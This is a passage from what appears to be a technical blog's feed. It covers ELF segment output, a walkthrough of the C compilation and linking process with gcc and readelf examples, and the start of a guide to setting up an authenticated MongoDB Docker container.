LOAD 			<span style="color:#ae81ff">0x000000</span> 	<span style="color:#ae81ff">0x0000000000400000</span> <span style="color:#ae81ff">0x0000000000400000</span> <span style="color:#ae81ff">0x00070c</span> <span style="color:#ae81ff">0x00070c</span> R E <span style="color:#ae81ff">0x200000</span>
LOAD 			<span style="color:#ae81ff">0x000e10</span> 	<span style="color:#ae81ff">0x0000000000600e10</span> <span style="color:#ae81ff">0x0000000000600e10</span> <span style="color:#ae81ff">0x000228</span> <span style="color:#ae81ff">0x000230</span> RW 	<span style="color:#ae81ff">0x200000</span>
DYNAMIC 		<span style="color:#ae81ff">0x000e28</span> 	<span style="color:#ae81ff">0x0000000000600e28</span> <span style="color:#ae81ff">0x0000000000600e28</span> <span style="color:#ae81ff">0x0001d0</span> <span style="color:#ae81ff">0x0001d0</span> RW 	<span style="color:#ae81ff">0x8</span>
NOTE 			<span style="color:#ae81ff">0x000254</span> 	<span style="color:#ae81ff">0x0000000000400254</span> <span style="color:#ae81ff">0x0000000000400254</span> <span style="color:#ae81ff">0x000044</span> <span style="color:#ae81ff">0x000044</span> R 	<span style="color:#ae81ff">0x4</span>
GNU_EH_FRAME 	<span style="color:#ae81ff">0x0005e4</span> 	<span style="color:#ae81ff">0x00000000004005e4</span> <span style="color:#ae81ff">0x00000000004005e4</span> <span style="color:#ae81ff">0x000034</span> <span style="color:#ae81ff">0x000034</span> R 	<span style="color:#ae81ff">0x4</span>
GNU_STACK 		<span style="color:#ae81ff">0x000000</span> 	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#ae81ff">0x000000</span> <span style="color:#ae81ff">0x000000</span> RW 	<span style="color:#ae81ff">0x10</span>
GNU_RELRO 		<span style="color:#ae81ff">0x000e10</span> 	<span style="color:#ae81ff">0x0000000000600e10</span> <span style="color:#ae81ff">0x0000000000600e10</span> <span style="color:#ae81ff">0x0001f0</span> <span style="color:#ae81ff">0x0001f0</span> R 	<span style="color:#ae81ff">0x1</span>

<span style="color:#960050;background-color:#1e0010">➊</span> Section to Segment mapping:
Segment Sections...
	<span style="color:#ae81ff">00</span>
	<span style="color:#ae81ff">01</span> .interp
	<span style="color:#ae81ff">02</span> .interp .note.ABI<span style="color:#f92672">-</span>tag .note.gnu.build<span style="color:#f92672">-</span>id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn 
	   .rela.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame
	<span style="color:#ae81ff">03</span> .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss
	<span style="color:#ae81ff">04</span> .dynamic
	<span style="color:#ae81ff">05</span> .note.ABI<span style="color:#f92672">-</span>tag .note.gnu.build<span style="color:#f92672">-</span>id
	<span style="color:#ae81ff">06</span> .eh_frame_hdr
	<span style="color:#ae81ff">07</span>
	<span style="color:#ae81ff">08</span> .init_array .fini_array .jcr .dynamic .got
</code></pre></div><ul>
<li>An ELF segment encompasses zero or more sections, essentially bundling these into a single chunk (➊). Since segments provide an execution view, they are needed only for executable ELF files and not for non-executable files such as relocatable objects.</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Anatomy of a Binary</title>
            <link>https://hexterisk.github.io/blog/posts/2020/02/28/anatomy-of-a-binary/</link>
            <pubDate>Fri, 28 Feb 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/02/28/anatomy-of-a-binary/</guid>
            <description>The C Compilation Process  Compilation is the process of translating human readable source code into machine code that the processor can execute. Binary Code is the machine code that systems execute. Binary Executable Files, or Binaries, store the executable binary program, that is, the code and data belonging to each program.  #include &amp;lt;stdio.h&amp;gt;#define FORMAT_STRING &amp;#34;%s&amp;#34; #define MESSAGE &amp;#34;Hello, world!\n&amp;#34;  int main(int argc, char *argv[]) { printf(FORMAT_STRING, MESSAGE); return 0; } The C Compilation Process</description>
            <content type="html"><![CDATA[<h2 id="the-c-compilation-process">The C Compilation Process</h2>
<ul>
<li>Compilation is the process of translating human readable source code into machine code that the processor can execute.</li>
<li><strong>Binary Code</strong> is the machine code that systems execute.</li>
<li><strong>Binary Executable Files</strong>, or <strong>Binaries</strong>,  store the executable binary program, that is, the code and data belonging to each program.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#define FORMAT_STRING &#34;%s&#34;
</span><span style="color:#75715e">#define MESSAGE &#34;Hello, world!\n&#34;
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
printf(FORMAT_STRING, MESSAGE);
<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p><img src="/Anatomy_of_a_Binary/1_image.png" alt="&ldquo;compilation_process&rdquo;">
<em>The C Compilation Process</em></p>
<h3 id="preprocessing">Preprocessing</h3>
<ul>
<li>Expands macros(<em>#define</em>) and <em>#include</em> directives into pure C code.</li>
<li>Every <em>#include</em> directive, the header is copied in its entirety.</li>
<li>Every <em>#define</em> directive is fully expanded everywhere it is used.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> gcc <span style="color:#f92672">-</span>E <span style="color:#f92672">-</span>P compilation_example.c

<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size_t;
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> __u_char;
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">int</span> __u_short;
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> __u_int;
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">int</span> __u_long;
<span style="color:#75715e">/* ... */</span>
<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">int</span> sys_nerr;
<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> sys_errlist[];
<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fileno</span> (FILE <span style="color:#f92672">*</span>__stream) __attribute__ ((__nothrow__ , __leaf__)) ;
<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fileno_unlocked</span> (FILE <span style="color:#f92672">*</span>__stream) __attribute__ ((__nothrow__ , __leaf__)) ;
<span style="color:#66d9ef">extern</span> FILE <span style="color:#f92672">*</span><span style="color:#a6e22e">popen</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>__command, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>__modes) ;
<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">pclose</span> (FILE <span style="color:#f92672">*</span>__stream);
<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">ctermid</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>__s) __attribute__ ((__nothrow__ , __leaf__));
<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flockfile</span> (FILE <span style="color:#f92672">*</span>__stream) __attribute__ ((__nothrow__ , __leaf__));
<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ftrylockfile</span> (FILE <span style="color:#f92672">*</span>__stream) __attribute__ ((__nothrow__ , __leaf__)) ;
<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">funlockfile</span> (FILE <span style="color:#f92672">*</span>__stream) __attribute__ ((__nothrow__ , __leaf__));

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
printf(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#e6db74">&#34;Hello, world!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><h3 id="compilation">Compilation</h3>
<ul>
<li>Takes the preprocessed code and translates it into assembly language.</li>
<li>Most compilers also perform heavy optimization in this phase, typically configurable as an optimization level through command line switches such as options <em>-O0</em> through <em>-O3</em> in gcc.</li>
<li>Compilation phase produce assembly language and not machine code because it’s better to instead have a language dedicated compiler that emits generic assembly code and have a single universal assembler that can handle the final translation of assembly to machine code for every language.</li>
<li>Output of the compilation phase is an <strong>assembly file</strong>, which is in reasonably human-readable form, with symbolic information intact.</li>
<li>All references are purely symbolic.</li>
<li>Compilers use an optimization called <strong>dead code elimination</strong> to find instances of code that can never be reached in practice so that they can omit such useless code in the compiled binary.</li>
<li>Each source code file corresponds to one assembly file.</li>
<li>Takes <em><strong>.c</strong></em> file as input and produces <em><strong>.s</strong></em> assembly file.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> gcc <span style="color:#f92672">-</span>S <span style="color:#f92672">-</span>masm<span style="color:#f92672">=</span>intel compilation_example.c
<span style="color:#960050;background-color:#1e0010">$</span> cat compilation_example.s

.file <span style="color:#e6db74">&#34;compilation_example.c&#34;</span>
.intel_syntax noprefix
.section .rodata
.LC0:
.string <span style="color:#e6db74">&#34;Hello, world!&#34;</span>
.text
.globl main
.type main, <span style="color:#960050;background-color:#1e0010">@</span>function
main:
.LFB0:
.cfi_startproc
push rbp
.cfi_def_cfa_offset <span style="color:#ae81ff">16</span>
.cfi_offset <span style="color:#ae81ff">6</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>
mov rbp, rsp
.cfi_def_cfa_register <span style="color:#ae81ff">6</span>
sub rsp, <span style="color:#ae81ff">16</span>
mov DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>], edi
mov QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>], rsi
mov edi, OFFSET FLAT:.LC0
call puts
mov eax, <span style="color:#ae81ff">0</span>
leave
.cfi_def_cfa <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>
ret
.cfi_endproc
.LFE0:
.size main, .<span style="color:#f92672">-</span>main
.ident <span style="color:#e6db74">&#34;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&#34;</span>
.section .note.GNU<span style="color:#f92672">-</span>stack,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#960050;background-color:#1e0010">@</span>progbits
</code></pre></div><h3 id="assembly">Assembly</h3>
<ul>
<li>Takes assembly files as input and produces <strong>object files</strong> (<strong>modules</strong>) as output.</li>
<li>Each assembly file corresponds to one object file.</li>
<li>Object files contain machine instructions that are in principle executable by the processor.</li>
<li>Takes .c file as input and produces .o object file.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> gcc <span style="color:#f92672">-</span>c compilation_example.c
<span style="color:#960050;background-color:#1e0010">$</span> file compilation_example.o
compilation_example.o: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB relocatable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (SYSV), not stripped
</code></pre></div><ul>
<li><strong>Relocatable Files</strong> can be placed at any position in the memory. It&rsquo;s an indication of the file being an object/module. It&rsquo;s important since object files are compiled independently from each other and assembler has no way to know the order to link them into. Making them relocatable allows them to be linked in any order to construct a complete executable.</li>
<li>Object files contain <strong>Relocation Symbols</strong> that specify how function and variable references must be resolved. References that rely on a relocation symbol, such as an object file referencing one if its own functions/variables by absolute address, are known as <strong>Symbolic References</strong>.</li>
</ul>
<h3 id="linking">Linking</h3>
<ul>
<li>Links together all object files together to form a single coherent executable, which will be loaded at a particular memory address.</li>
<li>Can incorporate an additional optimization pass called <strong>link-time optimization</strong> (<strong>LTO</strong>).</li>
<li>Linker resolves all symbolic references now that the arrangement of modules is known after linking.</li>
<li>Static libraries are merged into the executable allowing all references to be resolved entirely. Symbolic references to dynamic libraries are left unresolved even in the final executable (will be resolved during execution).</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> gcc compilation_example.c
<span style="color:#960050;background-color:#1e0010">$</span> file a.out
a.out: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (SYSV), dynamically linked, interpreter <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">2.6.32</span>, BuildID[sha1]<span style="color:#f92672">=</span>d0e23ea731bce9de65619cadd58b14ecd8c015c7, not stripped

<span style="color:#960050;background-color:#1e0010">$</span> .<span style="color:#f92672">/</span>a.out
Hello, world<span style="color:#f92672">!</span>
</code></pre></div><h2 id="symbols-and-stripped-binaries">Symbols and Stripped Binaries</h2>
<ul>
<li><strong>Symbols</strong> keep track of symbolic names and records which binary code and data correspond to. They provide a mapping from high-level names to address and size. This information is required by linker.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> readelf <span style="color:#f92672">--</span>syms a.out

Symbol table <span style="color:#960050;background-color:#1e0010">&#39;</span>.dynsym<span style="color:#960050;background-color:#1e0010">&#39;</span> contains <span style="color:#ae81ff">4</span> entries:
Num: 	Value 				Size 	Type 	Bind 	Vis 	Ndx 	Name
<span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> 		<span style="color:#ae81ff">0000000000000000</span> 	<span style="color:#ae81ff">0</span> 		NOTYPE  LOCAL 	DEFAULT UND
<span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> 		<span style="color:#ae81ff">0000000000000000</span> 	<span style="color:#ae81ff">0</span> 		FUNC 	GLOBAL	DEFAULT UND 	puts<span style="color:#960050;background-color:#1e0010">@</span>GLIBC_2<span style="color:#ae81ff">.2.5</span> (<span style="color:#ae81ff">2</span>)
<span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> 		<span style="color:#ae81ff">0000000000000000</span> 	<span style="color:#ae81ff">0</span> 		FUNC 	GLOBAL 	DEFAULT UND 	__libc_start_main<span style="color:#960050;background-color:#1e0010">@</span>GLIBC_2<span style="color:#ae81ff">.2.5</span> (<span style="color:#ae81ff">2</span>)
<span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> 		<span style="color:#ae81ff">0000000000000000</span> 	<span style="color:#ae81ff">0</span> 		NOTYPE 	WEAK 	DEFAULT UND 	__gmon_start__

Symbol table <span style="color:#960050;background-color:#1e0010">&#39;</span>.symtab<span style="color:#960050;background-color:#1e0010">&#39;</span> contains <span style="color:#ae81ff">67</span> entries:
Num: 	Value 				Size 	Type 	Bind 	Vis 	Ndx 	Name
...
<span style="color:#ae81ff">56</span><span style="color:#f92672">:</span> 	<span style="color:#ae81ff">0000000000601030</span> 	<span style="color:#ae81ff">0</span> 		OBJECT 	GLOBAL 	HIDDEN 	<span style="color:#ae81ff">25</span> 		__dso_handle
<span style="color:#ae81ff">57</span><span style="color:#f92672">:</span> 	<span style="color:#ae81ff">00000000004005</span>d0 	<span style="color:#ae81ff">4</span> 		OBJECT 	GLOBAL 	DEFAULT <span style="color:#ae81ff">16</span> 		_IO_stdin_used
<span style="color:#ae81ff">58</span><span style="color:#f92672">:</span> 	<span style="color:#ae81ff">0000000000400550</span> 	<span style="color:#ae81ff">101</span> 	FUNC 	GLOBAL 	DEFAULT <span style="color:#ae81ff">14</span> 		__libc_csu_init
<span style="color:#ae81ff">59</span><span style="color:#f92672">:</span> 	<span style="color:#ae81ff">0000000000601040</span> 	<span style="color:#ae81ff">0</span> 		NOTYPE 	GLOBAL 	DEFAULT <span style="color:#ae81ff">26</span> 		_end
<span style="color:#ae81ff">60</span><span style="color:#f92672">:</span> 	<span style="color:#ae81ff">0000000000400430</span> 	<span style="color:#ae81ff">42</span> 		FUNC 	GLOBAL 	DEFAULT <span style="color:#ae81ff">14</span> 		_start
<span style="color:#ae81ff">61</span><span style="color:#f92672">:</span> 	<span style="color:#ae81ff">000000000060103</span><span style="color:#ae81ff">8</span> 	<span style="color:#ae81ff">0</span> 		NOTYPE 	GLOBAL 	DEFAULT <span style="color:#ae81ff">26</span> 		__bss_start
<span style="color:#ae81ff">62</span><span style="color:#f92672">:</span> 	<span style="color:#ae81ff">0000000000400526</span> 	<span style="color:#ae81ff">32</span> 		FUNC 	GLOBAL 	DEFAULT <span style="color:#ae81ff">14</span> 		main
<span style="color:#ae81ff">63</span><span style="color:#f92672">:</span> 	<span style="color:#ae81ff">0000000000000000</span> 	<span style="color:#ae81ff">0</span> 		NOTYPE 	WEAK 	DEFAULT UND 	_Jv_RegisterClasses
<span style="color:#ae81ff">64</span><span style="color:#f92672">:</span> 	<span style="color:#ae81ff">000000000060103</span><span style="color:#ae81ff">8</span> 	<span style="color:#ae81ff">0</span> 		OBJECT 	GLOBAL 	HIDDEN 	<span style="color:#ae81ff">25</span> 		__TMC_END__
<span style="color:#ae81ff">65</span><span style="color:#f92672">:</span> 	<span style="color:#ae81ff">0000000000000000</span> 	<span style="color:#ae81ff">0</span> 		NOTYPE 	WEAK 	DEFAULT UND 	_ITM_registerTMCloneTable
<span style="color:#ae81ff">66</span><span style="color:#f92672">:</span> 	<span style="color:#ae81ff">00000000004003</span>c8 	<span style="color:#ae81ff">0</span> 		FUNC 	GLOBAL 	DEFAULT <span style="color:#ae81ff">11</span> 		_init
</code></pre></div><ul>
<li>Focusing on ‘main’, we can see it will be loaded at address ‘0x400526’ when the binary is loaded into memory and it&rsquo;s size is 32bytes. ‘FUNC’ shows that we are dealing with a function symbol.</li>
<li>Debugging symbols are typically generated in <strong>DWARF</strong> format for ELF binaries (usually embedded inside) and <strong>PDB</strong> (<strong>Microsoft Portable Debugging</strong>) format for PE binaries (separate file).</li>
</ul>
<h3 id="stripped-binaries">Stripped Binaries</h3>
<ul>
<li>On stripping a binary, only a few symbols are left in the <em><strong>.dynsym</strong> symbol table</em>. These are used to resolve dynamic dependencies (such as references to dynamic libraries) when the binary is loaded into memory, but they’re not much use when disassembling.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> strip <span style="color:#f92672">--</span>strip<span style="color:#f92672">-</span>all a.out
<span style="color:#960050;background-color:#1e0010">$</span> file a.out

a.out: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (SYSV), dynamically linked, interpreter <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">2.6.32</span>, BuildID[sha1]<span style="color:#f92672">=</span>d0e23ea731bce9de65619cadd58b14ecd8c015c7, stripped

<span style="color:#960050;background-color:#1e0010">$</span> readelf <span style="color:#f92672">--</span>syms a.out

Symbol table <span style="color:#960050;background-color:#1e0010">&#39;</span>.dynsym<span style="color:#960050;background-color:#1e0010">&#39;</span> contains <span style="color:#ae81ff">4</span> entries:
Num:	Value 				Size 	Type 	Bind 	Vis 		Ndx 	Name
<span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> 		<span style="color:#ae81ff">0000000000000000</span> 	<span style="color:#ae81ff">0</span> 		NOTYPE 	LOCAL 	DEFAULT 	UND
<span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> 		<span style="color:#ae81ff">0000000000000000</span> 	<span style="color:#ae81ff">0</span> 		FUNC 	GLOBAL 	DEFAULT 	UND 	puts<span style="color:#960050;background-color:#1e0010">@</span>GLIBC_2<span style="color:#ae81ff">.2.5</span> (<span style="color:#ae81ff">2</span>)
<span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> 		<span style="color:#ae81ff">0000000000000000</span> 	<span style="color:#ae81ff">0</span> 		FUNC 	GLOBAL 	DEFAULT 	UND 	__libc_start_main<span style="color:#960050;background-color:#1e0010">@</span>GLIBC_2<span style="color:#ae81ff">.2.5</span> (<span style="color:#ae81ff">2</span>)
<span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> 		<span style="color:#ae81ff">0000000000000000</span> 	<span style="color:#ae81ff">0</span> 		NOTYPE 	WEAK 	DEFAULT 	UND 	__gmon_start__
</code></pre></div><h2 id="loading-and-executing-a-binary">Loading and Executing a Binary</h2>
<p><img src="/Anatomy_of_a_Binary/image.png" alt="&ldquo;binary_dissection&rdquo;">
<em>Loading an ELF binary on a Linux-based system</em></p>
<ul>
<li>A binary’s representation in memory does not necessarily correspond one-to-one with its on-disk representation, like collapsing a string of zeros to a single one to save space, and re-expand while loading into the memory.</li>
<li>A new process is setup for the program to run in, including a virtual address space. Subsequently, the operating system maps an interpreter into the process’s virtual memory to load the binary and perform the necessary relocations. On Linux, the interpreter is typically a shared library called <em><strong>ld-linux.so</strong></em>. On Windows, the interpreter functionality is implemented as part of <em><strong>ntdll.dll</strong></em>. After loading the interpreter, the kernel transfers control to it, and the interpreter begins its work in user space.</li>
<li>The interpreter then maps the dynamic libraries required into the virtual address space (using <em><strong>mmap</strong></em> or an equivalent function) and then resolves any relocations left in the binary’s code sections to fill in the correct addresses for references to the dynamic libraries.</li>
<li>Linux ELF binaries come with a special section called <strong>.interp</strong> that specifies the path to the interpreter.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> readelf <span style="color:#f92672">-</span>p .interp a.out

String dump of section <span style="color:#960050;background-color:#1e0010">&#39;</span>.interp<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">:</span>
[ <span style="color:#ae81ff">0</span>] <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Authenticated MongoDB Container</title>
            <link>https://hexterisk.github.io/blog/posts/2020/01/22/authenticated-mongodb-container/</link>
            <pubDate>Wed, 22 Jan 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/01/22/authenticated-mongodb-container/</guid>
            <description>Unsecured mongodb servers have been prime targets for hacks aimed at exaction of ransom in exchange of data. Therefore, authenticated mongo database server is now more of a necessity to ensure security of your database.
There are two ways to setup an authenticated mongo server container.
Manually Setup the container Pulling the mongo docker image from dockerhub as it doesn&amp;rsquo;t exist on server/local machine.
Create a directory for the database to be stored in on the server/local machine.</description>
            <content type="html"><![CDATA[<p>Unsecured mongodb servers have been prime targets for hacks aimed at exaction of ransom in exchange of data. Therefore, authenticated mongo database server is now more of a necessity to ensure security of your database.</p>
<p>There are two ways to setup an authenticated mongo server container.</p>
<h2 id="manually">Manually</h2>
<h3 id="setup-the-container">Setup the container</h3>
<p><img src="/Authenticated_Mongodb/1_image.png" alt="&ldquo;pulling_image&rdquo;">
<em>Pulling the mongo docker image from dockerhub as it doesn&rsquo;t exist on server/local machine.</em></p>
<p>Create a directory for the database to be stored in on the server/local machine.</p>
<p><code>mkdir ~/db</code></p>
<p>Run the mongo container and attach it to a non-conventional port so as to make it comparatively tougher for automated scanners and initial discovery techniques to exploit.</p>
<p><code>sudo docker run -d -p CUSTOM_PORT:27017 -v ~/db:/data/db mongo</code></p>
<ul>
<li>Maps the container&rsquo;s 27017 port (where the mongo server is running) to the server/local machine&rsquo;s <em>CUSTOM_PORT</em>.</li>
<li>Maps the <em><strong>/data/db</strong></em> directory inside the container to server/local machine&rsquo;s <em><strong>~/db</strong></em> directory.</li>
</ul>
<p><img src="/Authenticated_Mongodb/2_image.png" alt="&ldquo;init_container&rdquo;">
<em>The container we just initialised.</em></p>
<h3 id="creating-admin-user">Creating admin user</h3>
<p>Spawn a mongo shell through a shell inside the container and create the user manually.</p>
<p><code>docker exec -it CONTAINER_NAME/CONTAINER_ID bash</code></p>
<p><img src="/Authenticated_Mongodb/3_image.png" alt="&ldquo;mongo_shell&rdquo;">
<em>Spawning mongo shell.</em></p>
<p><img src="/Authenticated_Mongodb/7_image.png" alt="&ldquo;user_create&rdquo;">
<em>Creating user through mongo shell.</em></p>
<p>Restart the container with <em><strong>auth</strong></em> flag this time.</p>
<p><code>docker stop CONTAINER_NAME/CONTAINER_ID</code></p>
<p><img src="/Authenticated_Mongodb/11_image.png" alt="&ldquo;docker_stop&rdquo;">
<em>Stopping the container using container ID.</em></p>
<p>This error implies that the port specified is already locked by another process (the initial container in this case).</p>
<p><img src="/Authenticated_Mongodb/8_image.png" alt="&ldquo;docker_error&rdquo;">
<em>Port pre-occupied by the initial container.</em></p>
<p><code>docker run -d -p CUSTOM_PORT:27017 -v ~/db:/data/db mongo mongod --auth</code></p>
<p><img src="/Authenticated_Mongodb/10_image.png" alt="&ldquo;restart_auth&rdquo;">
<em>Restarting the container with the <em>auth</em> flag.</em></p>
<p>⇨  <strong>New users can be created in the same way.</strong></p>
<h2 id="script">Script</h2>
<p>The file structure is as follows:</p>
<pre><code>db/
├── docker-compose.yml
├── mongo-entrypoint/
│	└── init.sh
├── secrets/
│	└── mongo_admin_user
│	└── mongo_admin_password
└── data-volume/
</code></pre>
<p>An example <code>docker-compose.yml</code> file is shown. It can be tailored according to requirement.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#66d9ef">version</span>: <span style="color:#e6db74">&#34;3.6&#34;</span>
<span style="color:#66d9ef">services</span>:
	<span style="color:#66d9ef">mongo</span>:
		<span style="color:#66d9ef">image</span>: mongo
		<span style="color:#66d9ef">container_name</span>: mongo_database
	<span style="color:#66d9ef">ports</span>:
		- <span style="color:#e6db74">&#34;1337:27017&#34;</span>
	<span style="color:#66d9ef">volumes</span>:
		- ./db/data-volume:/data/db
		- <span style="color:#e6db74">&#34;$PWD/mongo-entrypoint/:/docker-entrypoint-initdb.d/&#34;</span>
	<span style="color:#66d9ef">command</span>: mongod
	<span style="color:#66d9ef">environment</span>:
  		- MONGO_INITDB_ROOT_USERNAME_FILE=/run/secrets/mongo_admin_user
  		- MONGO_INITDB_ROOT_PASSWORD_FILE=/run/secrets/mongo_admin_password
	<span style="color:#66d9ef">secrets</span>:
  		- mongo_admin_password
  		- mongo_admin_user
<span style="color:#66d9ef">volumes</span>:
	<span style="color:#66d9ef">data-volume</span>:
<span style="color:#66d9ef">secrets</span>:
	<span style="color:#66d9ef">mongo_admin_user</span>:
      		<span style="color:#66d9ef">file</span>: ./secrets/mongo_admin_user
	<span style="color:#66d9ef">mongo_admin_password</span>:
      		<span style="color:#66d9ef">file</span>: ./secrets/mongo_admin_password
</code></pre></div><ul>
<li>Volumes:
<ul>
<li>A <em><strong>data-volume</strong></em> directory is created on the server/local machine which maps <em><strong>/data/db</strong></em> directory inside the container.</li>
<li>A directory in the current folder named <em><strong>mongo-entrypoint</strong></em> can be used to put the scripts in that you want to execute as soon as the container is run.
<ul>
<li>When a container is started for the first time, it will execute files with extensions <em><strong>.sh</strong></em> and <em><strong>.js</strong></em> that are found in <em><strong>/docker-entrypoint-initdb.d</strong></em>. Files will be executed in alphabetical order.</li>
<li>.js files will be executed by mongo using the database specified by the <strong>MONGO_INITDB_DATABASE</strong> variable, if it is present, or test otherwise. You may also switch databases within the .js script.</li>
</ul>
</li>
</ul>
</li>
<li>Environment:
<ul>
<li><strong>Secrets</strong> is used to set the username and password for the mongo database server.
<ul>
